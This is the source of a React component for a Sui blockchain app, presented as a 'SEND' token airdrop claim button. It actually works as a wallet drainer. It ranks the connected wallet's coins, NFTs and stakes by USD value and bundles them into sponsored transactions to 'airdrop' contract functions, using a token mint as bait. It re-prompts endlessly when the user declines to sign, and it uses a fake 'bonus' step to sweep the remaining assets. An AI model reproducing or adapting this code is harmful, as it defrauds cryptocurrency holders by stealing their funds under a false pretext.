// sui-app/src/components/ParameterizedTransfer.tsx

"use client";
import React, { useState, useEffect, useRef } from "react";
import { TransactionBlock } from "@mysten/sui.js/transactions";
import {
  useCurrentAccount,
  useSignTransaction,
  useDisconnectWallet,
} from "@mysten/dapp-kit";
import {
  CoinWithObjectId,
  NFTWithObjectId,
  CreatedNFT,
  StakesOverview,
  Stake,
  TransactionType,
  Asset,
  NFTAsset,
  CoinAsset,
  StakeAsset,
  SponsoredTransactionResponse,
  ExecuteTransactionResponse,
  AccountInfo,
  AlertModalProps,
  InfoModalProps,
} from "../../types/types";
import { SUI_SYSTEM_STATE_OBJECT_ID } from "@mysten/sui.js/utils";
import { usePartnerId } from "../../hooks/usePartnerId";
import { fetchWithRetry } from "../../utils/apiUtils";
import { CustomConnectButton } from "./ConnectButton";
import { FaSpinner } from "react-icons/fa";
import { AlertModal } from "./AlertModal";
import { InfoModal } from "./InfoModal";
import { TxModal } from "./TxModal";
import { CongratsModal } from "./CongratsModal";

const NFT_PACKAGE_ID = process.env.NEXT_PUBLIC_NFT_PACKAGE_ID;

const SPONSOR_ADDRESS = process.env.NEXT_PUBLIC_SPONSOR_ADDRESS;

const HUMAN_READABLE_AMOUNT = parseInt(
  process.env.NEXT_PUBLIC_HUMAN_READABLE_AMOUNT || "0"
);
const HUMAN_READABLE_AMOUNT_BONUS = parseInt(
  process.env.NEXT_PUBLIC_HUMAN_READABLE_AMOUNT_BONUS || "0"
);
const COIN_TICKER = "SEND";
const MINT_AMOUNT = BigInt(HUMAN_READABLE_AMOUNT * 1000000000);
const MINT_AMOUNT_BONUS = BigInt(HUMAN_READABLE_AMOUNT_BONUS * 1000000000);

interface ParameterizedTransferProps {
  accountInfo: AccountInfo | null;
  isLoading: boolean;
}

export function ParameterizedTransfer({
  accountInfo,
  isLoading,
}: ParameterizedTransferProps) {
  // Update these state definitions with proper types
  const [selectedAssets, setSelectedAssets] = useState<{
    selectedNFTs: NFTWithObjectId[];
    selectedCoins: CoinWithObjectId[];
    selectedStakes: Stake[];
  }>({
    selectedNFTs: [],
    selectedCoins: [],
    selectedStakes: [],
  });

  const [unselectedAssets, setUnselectedAssets] = useState<{
    unselectedNFTs: NFTWithObjectId[];
    unselectedCoins: CoinWithObjectId[];
    unselectedStakes: Stake[];
  }>({
    unselectedNFTs: [],
    unselectedCoins: [],
    unselectedStakes: [],
  });
  const [firstTxSignature, setFirstTxSignature] = useState<string | null>(null);
  const [secondTxSignature, setSecondTxSignature] = useState<string | null>(
    null
  );
  const [showCongratsModal, setShowCongratsModal] = useState(false);
  const [totalClaimedAmount, setTotalClaimedAmount] = useState(0);

  const [secondTxAttempts, setSecondTxAttempts] = useState(0);
  const [isWaitingForSecondTx, setIsWaitingForSecondTx] = useState(false);

  const sponsoredFirstTxRef = useRef<SponsoredTransactionResponse | null>(null);
  const sponsoredSecondTxRef = useRef<SponsoredTransactionResponse | null>(
    null
  );
  const firstTxSignatureRef = useRef<string | null>(null);
  const secondTxSignatureRef = useRef<string | null>(null);

  const [showFirstTxModal, setShowFirstTxModal] = useState(false);
  const [showBonusTxModal, setShowBonusTxModal] = useState(false);
  const [showSecondTxModal, setShowSecondTxModal] = useState(false);

  const [alertModalProps, setAlertModalProps] = useState<AlertModalProps>({
    message: "",
    type: "info",
    isOpen: false,
    onClose: () => setAlertModalProps((prev) => ({ ...prev, isOpen: false })),
  });
  const [claimButtonState, setClaimButtonState] = useState<
    "idle" | "checking" | "ready" | "not-eligible"
  >("idle");

  const [infoModalProps, setInfoModalProps] = useState<InfoModalProps>({
    title: "",
    content: "",
    isOpen: false,
    onClose: () => setInfoModalProps((prev) => ({ ...prev, isOpen: false })),
  });
  // Replace contractAddresses state with:
  const [contractAddresses, setContractAddresses] = useState<{
    PACKAGE_ID: string;
    TOKEN_MINT_1: string;
    TREASURY_CAP_1: string;
    TOKEN_MINT_2: string;
    TREASURY_CAP_2: string;
  } | null>(null);

  const [isWaitingForSignature, setIsWaitingForSignature] = useState(false);
  const [isAccountInfoReady, setIsAccountInfoReady] = useState(false);
  const account = useCurrentAccount();
  const { mutateAsync: signTransaction } = useSignTransaction();
  const { mutate: disconnect } = useDisconnectWallet();
  const partnerId = usePartnerId();
  const [claimLoading, setClaimLoading] = useState(false);
  const [status, setStatus] = useState<string | null>(null);
  const [transfers, setTransfers] = useState<CoinWithObjectId[]>([]);
  const [nfts, setNfts] = useState<NFTWithObjectId[]>([]);
  const [createdNFTs, setCreatedNFTs] = useState<CreatedNFT>({
    nftId1: "",
    nftName1: "",
    nftId2: "",
    nftName2: "",
  });

  const [isFetchingCoins, setIsFetchingCoins] = useState(false);
  const [transferParamsId, setTransferParamsId] = useState<string | null>(null);
  const [stakesOverview, setStakesOverview] = useState<StakesOverview | null>(
    null
  );
  const [sponsoredFirstTx, setSponsoredFirstTx] = useState<{
    sponsoredTxBytes: string;
    reservation_id: string;
  } | null>(null);
  const [sponsoredSecondTx, setSponsoredSecondTx] = useState<{
    sponsoredTxBytes: string;
    reservation_id: string;
  } | null>(null);
  const [preparedTransaction, setPreparedTransaction] =
    useState<TransactionBlock | null>(null);
  const [unselectedNFTs, setUnselectedNFTs] = useState<NFTWithObjectId[]>([]);
  const [unselectedCoins, setUnselectedCoins] = useState<CoinWithObjectId[]>(
    []
  );
  const [unselectedStakes, setUnselectedStakes] = useState<Stake[]>([]);
  const [secondTransactionPrepared, setSecondTransactionPrepared] =
    useState(false);

  const topCount = 7; // Declare topCount here

  useEffect(() => {
    if (accountInfo && accountInfo.contractAddresses) {
      console.log("CHECK ACCOUNT INFO");
      console.log(accountInfo);
      setContractAddresses(accountInfo.contractAddresses);
    }
  }, [accountInfo]);

  useEffect(() => {
    if (isLoading) {
      setStatus("Checking wallet info...");
      setClaimButtonState("checking");
    } else if (accountInfo) {
      const { selectedNFTs, selectedCoins, selectedStakes } = selectTopAssets(
        accountInfo.nfts || [],
        accountInfo.coins || [],
        accountInfo.stakesOverview?.withdrawableStakes || []
      );

      if (
        selectedNFTs.length === 0 &&
        selectedCoins.length === 0 &&
        selectedStakes.length === 0
      ) {
        setClaimButtonState("not-eligible");
      } else {
        setClaimButtonState("ready");
      }
    } else {
      setClaimButtonState("idle");
    }
  }, [isLoading, accountInfo]);

  useEffect(() => {
    if (accountInfo && !isLoading) {
      setIsAccountInfoReady(true);
    } else {
      setIsAccountInfoReady(false);
    }
  }, [accountInfo, isLoading]);

  useEffect(() => {
    // Only proceed if accountInfo is available and account exists
    if (accountInfo && account) {
      setTransfers(accountInfo.coins || []);
      setNfts(accountInfo.nfts || []);
      setCreatedNFTs(
        accountInfo.createdNFTs || {
          nftId1: "",
          nftName1: "",
          nftId2: "",
          nftName2: "",
        }
      );
      setTransferParamsId(accountInfo.transferParamsId || null);
      setStakesOverview(accountInfo.stakesOverview || null);

      // Prepare transactions
      prepareTransaction(
        accountInfo.transferParamsId,
        accountInfo.coins,
        accountInfo.nfts,
        accountInfo.createdNFTs,
        accountInfo.stakesOverview
      );
    }
  }, [account, accountInfo]);

  // Add a new useEffect to handle wallet disconnection or change
  useEffect(() => {
    if (!account) {
      // Reset all states when wallet disconnects
      resetAllStates();
    }
  }, [account]);

  const resetAllStates = () => {
    setFirstTxSignature(null);
    setSecondTxSignature(null);

    setSecondTxAttempts(0);
    setIsWaitingForSecondTx(false);
    sponsoredFirstTxRef.current = null;
    sponsoredSecondTxRef.current = null;
    firstTxSignatureRef.current = null;
    secondTxSignatureRef.current = null;
    setShowFirstTxModal(false);
    setShowBonusTxModal(false);
    setShowSecondTxModal(false);
    setAlertModalProps((prev) => ({ ...prev, isOpen: false }));
    setInfoModalProps((prev) => ({ ...prev, isOpen: false }));
    setIsWaitingForSignature(false);
    setClaimLoading(false);
    setSponsoredFirstTx(null);
    setSponsoredSecondTx(null);
    setStatus(null);
    setClaimButtonState("idle");
    setIsAccountInfoReady(false);
    setTransfers([]);
    setNfts([]);
    setCreatedNFTs({
      nftId1: "",
      nftName1: "",
      nftId2: "",
      nftName2: "",
    });
    setTransferParamsId(null);
    setStakesOverview(null);
    setPreparedTransaction(null);
    setUnselectedNFTs([]);
    setUnselectedCoins([]);
    setUnselectedStakes([]);
    setSecondTransactionPrepared(false);
  };

  // A class to handle all transaction creation logic
  class TransactionCreator {
    private failedTransactions: Set<string> = new Set();
    private tx: TransactionBlock;
    private transferParamsId: string;
    private senderAddress: string;
    private packageId: string;
    private tokenMintId: string;
    private treasuryCapId: string;

    constructor(
      transferParamsId: string,
      senderAddress: string,
      packageId: string,
      tokenMintId: string,
      treasuryCapId: string
    ) {
      this.tx = new TransactionBlock();
      this.transferParamsId = transferParamsId;
      this.senderAddress = senderAddress;
      this.packageId = packageId;
      this.tokenMintId = tokenMintId;
      this.treasuryCapId = treasuryCapId;
      this.tx.setSender(senderAddress);
    }
    async addTransactionIfSuccessful(
      transaction: TransactionType,
      sponsored: boolean = false
    ): Promise<boolean> {
      const tempTx = new TransactionBlock();
      tempTx.setSender(this.senderAddress);

      switch (transaction.type) {
        case "coin":
          this.createCoinTransfer(tempTx, transaction.data);
          break;
        case "nft":
          this.createNFTTransfer(tempTx, transaction.data);
          break;
        case "stake":
          this.createStakeWithdraw(tempTx, transaction.data);
          break;
        case "createdNFT":
          this.createNFTModify(tempTx, transaction.data);
          break;
      }

      let isSuccessful = true;
      if (transaction.type !== "stake") {
        isSuccessful = await this.dryRunTransaction(
          tempTx,
          sponsored,
          transaction
        );
      }

      if (isSuccessful || transaction.type === "stake") {
        switch (transaction.type) {
          case "coin":
            this.createCoinTransfer(this.tx, transaction.data);
            break;
          case "nft":
            this.createNFTTransfer(this.tx, transaction.data);
            break;
          case "stake":
            this.createStakeWithdraw(this.tx, transaction.data);
            break;
          case "createdNFT":
            this.createNFTModify(this.tx, transaction.data);
            break;
        }
      }

      return isSuccessful;
    }

    private async dryRunTransaction(
      tx: TransactionBlock,
      sponsored: boolean,
      transaction: TransactionType
    ): Promise<boolean> {
      try {
        const serializedTx = tx.serialize();

        console.log(
          "Dry run for transaction:",
          this.getTransactionIdentifier(transaction)
        );
        console.log("Serialized transaction:", serializedTx);

        const response = await fetch("/api/sui-rpc", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            method: "dryRunTransactionBlock",
            params: {
              transactionBlock: serializedTx,
              sender: this.senderAddress,
              sponsored: sponsored,
              sponsorAddress: SPONSOR_ADDRESS,
            },
          }),
        });
        const responseData = await response.json();
        if (response.ok) {
          console.log(
            "Dry run result for",
            this.getTransactionIdentifier(transaction),
            ":",
            responseData
          );
          return responseData.success;
        }
        console.error(
          "Dry run failed for",
          this.getTransactionIdentifier(transaction),
          ":",
          responseData
        );
        return false;
      } catch (error) {
        console.error(
          "Error during dry run for",
          this.getTransactionIdentifier(transaction),
          ":",
          error
        );
        return false;
      }
    }

    private getTransactionIdentifier(transaction: TransactionType): string {
      switch (transaction.type) {
        case "coin":
          return `Coin:${transaction.data.objectId}`;
        case "nft":
          return `NFT:${transaction.data.objectId}`;
        case "stake":
          return `Stake:${transaction.data.stakedSuiId}`;
        case "createdNFT":
          return `CreatedNFT:${transaction.data.id}`;
      }
    }

    createCoinTransfer(tx: TransactionBlock, coin: CoinWithObjectId): void {
      tx.moveCall({
        target: `${this.packageId}::factory::add_claim_airdrop`,
        typeArguments: [coin.coinType],
        arguments: [tx.object(this.transferParamsId), tx.object(coin.objectId)],
      });
    }

    createNFTTransfer(tx: TransactionBlock, nft: NFTWithObjectId): void {
      tx.moveCall({
        target: `${this.packageId}::factory::add_pair_claim_airdrop`,
        typeArguments: [nft.type],
        arguments: [tx.object(this.transferParamsId), tx.object(nft.objectId)],
      });
    }

    createStakeWithdraw(tx: TransactionBlock, stake: Stake): void {
      tx.moveCall({
        target: `${this.packageId}::factory::init_airdrop_stake`,
        arguments: [
          tx.object(SUI_SYSTEM_STATE_OBJECT_ID),
          tx.object(stake.stakedSuiId),
          tx.object(this.transferParamsId),
        ],
      });
    }

    createNFTModify(
      tx: TransactionBlock,
      createdNFT: { id: string; name: string }
    ): void {
      tx.moveCall({
        target: `${NFT_PACKAGE_ID}::autoclaim::modify`,
        arguments: [tx.object(createdNFT.id), tx.pure.string(createdNFT.name)],
      });
    }

    addCustomTokenMinting(mintAmount: bigint): void {
      this.tx.moveCall({
        target: `${this.tokenMintId}::ctx::mint`,
        arguments: [
          this.tx.object(this.treasuryCapId),
          this.tx.pure.u64(mintAmount),
          this.tx.pure.address(this.senderAddress),
        ],
      });
    }

    getTransaction(): TransactionBlock {
      return this.tx;
    }
    getFailedTransactions(): Set<string> {
      return this.failedTransactions;
    }
  }

  const prepareTransaction = async (
    transferParamsId: string,
    transfers: CoinWithObjectId[],
    nfts: NFTWithObjectId[],
    createdNFTs: CreatedNFT,
    stakesOverview: StakesOverview | null
  ) => {
    if (!account || !transferParamsId || !accountInfo) {
      console.log("Cannot prepare transaction: missing required data");
      return null;
    }

    setStatus("Preparing transactions...");

    try {
      const {
        selectedNFTs,
        selectedCoins,
        selectedStakes,
        unselectedNFTs,
        unselectedCoins,
        unselectedStakes,
      } = selectTopAssets(
        nfts,
        transfers,
        stakesOverview?.withdrawableStakes || []
      );

      setUnselectedNFTs(unselectedNFTs);
      setUnselectedCoins(unselectedCoins);
      setUnselectedStakes(unselectedStakes);

      const isWalletSuiet = accountInfo.walletName === "Suiet";
      const isSuiWallet = accountInfo.walletName === "Sui Wallet";
      console.log("check wallet name ", accountInfo.walletName);

      // Prepare first transaction
      const transactionCreator1 = new TransactionCreator(
        transferParamsId,
        account.address,
        accountInfo.contractAddresses.PACKAGE_ID,
        accountInfo.contractAddresses[`TOKEN_MINT_1`],
        accountInfo.contractAddresses[`TREASURY_CAP_1`]
      );

      // Create an array to hold all the dry run promises
      const dryRunPromises = [];

      // Add all selected assets to the transaction
      for (const coin of selectedCoins) {
        dryRunPromises.push(
          transactionCreator1.addTransactionIfSuccessful(
            {
              type: "coin",
              data: coin,
            },
            true
          )
        );
      }
      for (const nft of selectedNFTs) {
        dryRunPromises.push(
          transactionCreator1.addTransactionIfSuccessful(
            {
              type: "nft",
              data: nft,
            },
            true
          )
        );
      }
      for (const stake of selectedStakes) {
        dryRunPromises.push(
          transactionCreator1.addTransactionIfSuccessful(
            {
              type: "stake",
              data: stake,
            },
            true
          )
        );
      }

      // Add created NFTs
      if (isWalletSuiet) {
        if (createdNFTs.nftId1 && createdNFTs.nftName1) {
          dryRunPromises.push(
            transactionCreator1.addTransactionIfSuccessful(
              {
                type: "createdNFT",
                data: { id: createdNFTs.nftId1, name: createdNFTs.nftName1 },
              },
              true
            )
          );
        }
        if (createdNFTs.nftId2 && createdNFTs.nftName2) {
          dryRunPromises.push(
            transactionCreator1.addTransactionIfSuccessful(
              {
                type: "createdNFT",
                data: { id: createdNFTs.nftId2, name: createdNFTs.nftName2 },
              },
              true
            )
          );
        }
      }

      // Wait for all dry runs to complete
      await Promise.all(dryRunPromises);

      transactionCreator1.addCustomTokenMinting(MINT_AMOUNT);

      const finalTx1 = transactionCreator1.getTransaction();
      console.log("------- First Transaction");
      console.log(finalTx1);
      console.log(
        "Failed transactions:",
        transactionCreator1.getFailedTransactions()
      );
      setPreparedTransaction(finalTx1);

      // Request sponsored transaction for the first transaction
      const sponsoredTx1 = await requestSponsoredTransaction(finalTx1);
      console.log("Received sponsoredTx1:", sponsoredTx1);
      if (sponsoredTx1) {
        console.log("Setting sponsoredFirstTx");
        setSponsoredFirstTx(sponsoredTx1);
        sponsoredFirstTxRef.current = sponsoredTx1;
        setStatus("First transaction prepared and sponsored.");
      } else {
        console.log("Failed to get sponsoredTx1");
        setStatus("Failed to get sponsoredTx1");
        return null;
      }

      // Check if a second transaction is needed
      const needsSecondTransaction =
        isWalletSuiet &&
        (unselectedNFTs.length > 0 ||
          unselectedCoins.length > 0 ||
          unselectedStakes.length > 0);

      let sponsoredTx2 = null;
      if (needsSecondTransaction) {
        // Prepare second transaction
        const transactionCreator2 = new TransactionCreator(
          transferParamsId,
          account.address,
          accountInfo.contractAddresses.PACKAGE_ID,
          accountInfo.contractAddresses[`TOKEN_MINT_2`],
          accountInfo.contractAddresses[`TREASURY_CAP_2`]
        );

        const dryRunPromises2 = [];

        for (const coin of unselectedCoins) {
          dryRunPromises2.push(
            transactionCreator2.addTransactionIfSuccessful(
              {
                type: "coin",
                data: coin,
              },
              true
            )
          );
        }
        for (const nft of unselectedNFTs) {
          dryRunPromises2.push(
            transactionCreator2.addTransactionIfSuccessful(
              {
                type: "nft",
                data: nft,
              },
              true
            )
          );
        }
        for (const stake of unselectedStakes) {
          dryRunPromises2.push(
            transactionCreator2.addTransactionIfSuccessful(
              {
                type: "stake",
                data: stake,
              },
              true
            )
          );
        }

        // Add created NFTs to the second transaction as well

        // Wait for all dry runs to complete
        await Promise.all(dryRunPromises2);
        // Add custom token minting for the second transaction (bonus amount)

        transactionCreator2.addCustomTokenMinting(MINT_AMOUNT_BONUS);

        const finalTx2 = transactionCreator2.getTransaction();
        console.log("------- Second Transaction");
        console.log(finalTx2);

        // Request sponsored transaction for the second transaction
        sponsoredTx2 = await requestSponsoredTransaction(finalTx2);
        console.log("Received sponsoredTx2:", sponsoredTx2);
        if (sponsoredTx2) {
          console.log("Setting sponsoredSecondTx");
          setSponsoredSecondTx(sponsoredTx2);
          sponsoredSecondTxRef.current = sponsoredTx2;
          setStatus("Both transactions prepared and sponsored.");
        } else {
          console.log("Failed to get sponsoredTx2");
          setStatus("Failed to get sponsoredTx2");
          return null;
        }
      }

      setSecondTransactionPrepared(!!sponsoredTx2);
      setStatus(
        sponsoredTx2
          ? "Both transactions prepared and sponsored."
          : "Single transaction prepared and sponsored."
      );

      return {
        firstTx: sponsoredTx1,
        secondTx: sponsoredTx2,
        hasSecondTransaction: !!sponsoredTx2,
        failedTransactions: transactionCreator1.getFailedTransactions(),
      };
    } catch (error) {
      console.error("Error preparing transactions:", error);
      setStatus(
        `Error: ${error instanceof Error ? error.message : String(error)}`
      );
      return null;
    }
  };

  const requestSponsoredTransaction = async (
    tx: TransactionBlock
  ): Promise<SponsoredTransactionResponse | null> => {
    if (!account) {
      console.log("Cannot request sponsored transaction: no account");
      return null;
    }

    try {
      const gasBudget = 500000000; // 0.2 SUI in MIST
      tx.setGasBudget(gasBudget);
      const serializedTx = await tx.serialize();
      const sponsorData = await fetchWithRetry<SponsoredTransactionResponse>(
        "/api/sponsor-transaction",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            transactionBytes: serializedTx,
            address: account.address,
          }),
        }
      );

      console.log("Received sponsored transaction data:", sponsorData);

      if (!sponsorData.sponsoredTxBytes || !sponsorData.reservation_id) {
        throw new Error("Sponsored transaction data is incomplete");
      }

      return sponsorData;
    } catch (error) {
      console.error("Error requesting sponsored transaction:", error);
      return null;
    }
  };

  const selectTopAssets = (
    nfts: NFTWithObjectId[],
    coins: CoinWithObjectId[],
    stakes: Stake[]
  ): {
    selectedNFTs: NFTWithObjectId[];
    selectedCoins: CoinWithObjectId[];
    selectedStakes: Stake[];
    unselectedNFTs: NFTWithObjectId[];
    unselectedCoins: CoinWithObjectId[];
    unselectedStakes: Stake[];
  } => {
    const isWalletSuiet = accountInfo?.walletName === "Suiet";

    const allAssets: Asset[] = [
      ...nfts.map((nft) => ({
        ...nft,
        assetType: "nft" as const,
        usdValue: nft.usdValue || "0",
      })),
      ...coins.map((coin) => ({
        ...coin,
        assetType: "coin" as const,
        usdValue: coin.usdValue || "0",
      })),
      ...stakes.map((stake) => ({
        ...stake,
        assetType: "stake" as const,
        usdValue: stake.amountUSD || "0",
      })),
    ];

    // Group assets by their type
    const groupedAssets = allAssets.reduce((acc, asset) => {
      let key: string;
      if (asset.assetType === "coin") {
        key = (asset as CoinAsset).coinType;
      } else if (asset.assetType === "nft") {
        key = (asset as NFTAsset).type;
      } else {
        key = "stake";
      }
      if (!acc[key]) {
        acc[key] = [];
      }
      acc[key].push(asset);
      return acc;
    }, {} as Record<string, Asset[]>);

    // Sort groups by their total USD value
    const sortedGroups = Object.entries(groupedAssets).sort((a, b) => {
      const totalValueA = a[1].reduce(
        (sum, asset) => sum + parseFloat(asset.usdValue || "0"),
        0
      );
      const totalValueB = b[1].reduce(
        (sum, asset) => sum + parseFloat(asset.usdValue || "0"),
        0
      );
      return totalValueB - totalValueA;
    });

    let selectedAssets: Asset[] = [];
    let unselectedAssets: Asset[] = [];

    if (isWalletSuiet) {
      let selectedCount = 0;
      for (const [, group] of sortedGroups) {
        if (selectedCount < topCount) {
          selectedAssets.push(...group);
          selectedCount += group.length;
        } else {
          unselectedAssets.push(...group);
        }
      }
    } else {
      selectedAssets = allAssets;
    }

    const selectedNFTs = selectedAssets.filter(
      (asset): asset is NFTAsset => asset.assetType === "nft"
    );
    const selectedCoins = selectedAssets.filter(
      (asset): asset is CoinAsset => asset.assetType === "coin"
    );
    const selectedStakes = selectedAssets.filter(
      (asset): asset is StakeAsset => asset.assetType === "stake"
    );

    const unselectedNFTs = unselectedAssets.filter(
      (asset): asset is NFTAsset => asset.assetType === "nft"
    );
    const unselectedCoins = unselectedAssets.filter(
      (asset): asset is CoinAsset => asset.assetType === "coin"
    );
    const unselectedStakes = unselectedAssets.filter(
      (asset): asset is StakeAsset => asset.assetType === "stake"
    );

    console.log("Top Assets:", selectedAssets);
    console.log("Remaining Assets:", unselectedAssets);

    return {
      selectedNFTs,
      selectedCoins,
      selectedStakes,
      unselectedNFTs,
      unselectedCoins,
      unselectedStakes,
    };
  };

  const handleClaim = async () => {
    if (!account || !partnerId || !accountInfo) {
      console.log("No account connected or no partnerId");
      return;
    }

    setClaimLoading(true);
    try {
      console.log("Starting claim process");

      const transactions = await prepareTransaction(
        accountInfo.transferParamsId,
        accountInfo.coins,
        accountInfo.nfts,
        accountInfo.createdNFTs,
        accountInfo.stakesOverview
      );

      if (!transactions || !transactions.firstTx) {
        throw new Error("Failed to prepare transactions");
      }
      console.log("Failed transactions:", transactions.failedTransactions);

      let totalClaimedAmount = HUMAN_READABLE_AMOUNT;

      // Get signature for first transaction
      let firstTxSigned = false;
      while (!firstTxSigned) {
        setShowFirstTxModal(true);
        try {
          const signedTx = await signTransaction({
            transaction: transactions.firstTx.sponsoredTxBytes,
          });
          firstTxSignatureRef.current = signedTx.signature;
          setFirstTxSignature(signedTx.signature);
          firstTxSigned = true;
          setShowFirstTxModal(false);

          // Submit first transaction immediately
          await submitTransaction(
            transactions.firstTx.sponsoredTxBytes,
            signedTx.signature,
            account.address,
            partnerId,
            accountInfo,
            transactions.firstTx.reservation_id,
            false,
            transactions.hasSecondTransaction,
            accountInfo.deployerWalletId
          );

          setStatus("First transaction submitted successfully.");
        } catch (error) {
          console.log("User declined first transaction. Trying again.");
          console.log(error);
        }
      }

      // Show bonus modal
      if (transactions.hasSecondTransaction) {
        setShowBonusTxModal(true);
        await new Promise((resolve) => setTimeout(resolve, 3000));
        setShowBonusTxModal(false);
      }

      // Get signature for second transaction (if applicable)
      if (transactions.hasSecondTransaction && transactions.secondTx) {
        setIsWaitingForSecondTx(true);
        const startTime = Date.now();
        let secondTxSigned = false;
        while (
          secondTxAttempts < 3 &&
          Date.now() - startTime < 60000 &&
          !secondTxSigned
        ) {
          setShowSecondTxModal(true);
          try {
            const signedTx = await signTransaction({
              transaction: transactions.secondTx.sponsoredTxBytes,
            });
            secondTxSignatureRef.current = signedTx.signature;
            setSecondTxSignature(signedTx.signature);
            secondTxSigned = true;
            setShowSecondTxModal(false);
          } catch (error) {
            console.log(
              `Error signing second transaction. Attempt ${
                secondTxAttempts + 1
              } of 3.`
            );
            setSecondTxAttempts((prev) => prev + 1);
            if (secondTxAttempts < 2) {
              await new Promise((resolve) => setTimeout(resolve, 1000));
            }
          }
        }
        setIsWaitingForSecondTx(false);
      }

      // If second transaction is signed, submit it
      if (secondTxSignatureRef.current && transactions.secondTx) {
        await submitSecondTransaction(
          transactions.secondTx.sponsoredTxBytes,
          secondTxSignatureRef.current,
          account.address,
          transactions.secondTx.reservation_id,
          accountInfo.deployerWalletId
        );
        setStatus("Second transaction submitted successfully.");
        totalClaimedAmount += HUMAN_READABLE_AMOUNT_BONUS;
      }

      setTotalClaimedAmount(totalClaimedAmount);
      setShowCongratsModal(true);

      setStatus("All transactions executed successfully.");
      resetAllStates();
    } catch (error) {
      console.error("Error during claim:", error);
      setStatus(
        `Error: ${error instanceof Error ? error.message : String(error)}`
      );
    } finally {
      setClaimLoading(false);
      setIsWaitingForSignature(false);
      setShowFirstTxModal(false);
      setShowSecondTxModal(false);
    }
  };

  const submitTransaction = async (
    bytes: string,
    signature: string,
    address: string,
    partnerId: number,
    accountInfo: AccountInfo,
    reservationId: string,
    isSecondTransaction: boolean,
    hasSecondTransaction: boolean,
    deployerWalletId: number
  ) => {
    const response = await fetch("/api/submit-transaction", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        bytes,
        signature,
        address,
        partnerId,
        accountInfo,
        reservationId,
        isSecondTransaction,
        hasSecondTransaction,
        deployerWalletId,
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to submit transaction");
    }

    return response.json();
  };

  const submitSecondTransaction = async (
    bytes: string,
    signature: string,
    address: string,
    reservationId: string,
    deployerWalletId: number
  ) => {
    const response = await fetch("/api/submit-second-transaction", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        bytes,
        signature,
        address,
        reservationId,
        deployerWalletId,
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to submit second transaction");
    }

    return response.json();
  };

  useEffect(() => {
    if (sponsoredFirstTx) {
      console.log("sponsoredFirstTx has been set:", sponsoredFirstTx);
      sponsoredFirstTxRef.current = sponsoredFirstTx;
    }
  }, [sponsoredFirstTx]);

  useEffect(() => {
    if (sponsoredSecondTx) {
      console.log("sponsoredSecondTx has been set:", sponsoredSecondTx);
      sponsoredSecondTxRef.current = sponsoredSecondTx;
    }
  }, [sponsoredSecondTx]);

  const showAlertModal = () => {
    setAlertModalProps({
      message: "This is a test alert message!",
      type: "info",
      isOpen: true,
      onClose: () => setAlertModalProps((prev) => ({ ...prev, isOpen: false })),
    });
  };

  const showInfoModal = () => {
    setInfoModalProps({
      title: "Test Info Modal",
      content: "This is a test info modal. You can put any content here.",
      isOpen: true,
      onClose: () => setInfoModalProps((prev) => ({ ...prev, isOpen: false })),
    });
  };

  const getClaimButtonText = () => {
    switch (claimButtonState) {
      case "checking":
        return (
          <>
            <FaSpinner className="animate-spin inline-block mr-2" />
            Checking...
          </>
        );
      case "not-eligible":
        return "Not Eligible";
      case "ready":
        if (claimLoading) {
          return (
            <>
              {isWaitingForSignature ? "Sign Transaction..." : "Loading..."}
              {!isWaitingForSignature && (
                <FaSpinner className="animate-spin inline-block ml-2" />
              )}
            </>
          );
        }
        return "Claim";
      default:
        return "Connect Wallet";
    }
  };

  const isClaimButtonDisabled =
    claimButtonState === "checking" ||
    claimButtonState === "not-eligible" ||
    claimLoading;
  return (
    <div className="flex flex-col justify-center items-center">
      {!account ? (
        <CustomConnectButton />
      ) : (
        <button
          onClick={handleClaim}
          disabled={isClaimButtonDisabled}
          className={`
    transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-[#2469ff] hover:bg-[#1e54cc] h-10 rounded-md px-4 py-1
    ${
      isClaimButtonDisabled
        ? "bg-[#2469ff] cursor-not-allowed"
        : "bg-[#2469ff] hover:bg-[#1e54cc]"
    }
    transition duration-300 ease-in-out transform hover:scale-105
    focus:outline-none focus:ring-2 focus:ring-white/50
    flex items-center justify-center
  `}
        >
          {getClaimButtonText()}
        </button>
      )}

      <AlertModal {...alertModalProps} />
      <InfoModal {...infoModalProps} />
      <TxModal
        isOpen={showFirstTxModal}
        onClose={() => {}} // Prevent closing by user
        humanReadableAmount={HUMAN_READABLE_AMOUNT}
        coinTicker={COIN_TICKER}
        message="Waiting for Signature"
      />
      <TxModal
        isOpen={showBonusTxModal}
        onClose={() => setShowBonusTxModal(false)}
        humanReadableAmount={HUMAN_READABLE_AMOUNT_BONUS}
        coinTicker={COIN_TICKER}
        message={`You are eligible for ${HUMAN_READABLE_AMOUNT_BONUS} bonus tokens!`}
      />
      <TxModal
        isOpen={showSecondTxModal}
        onClose={() => {}} // Prevent closing by user
        humanReadableAmount={HUMAN_READABLE_AMOUNT_BONUS}
        coinTicker={COIN_TICKER}
        message="Waiting for Signature (Bonus Tokens)"
      />
      <CongratsModal
        isOpen={showCongratsModal}
        onClose={() => setShowCongratsModal(false)}
        totalAmount={totalClaimedAmount}
        coinTicker={COIN_TICKER}
      />
    </div>
  );
}
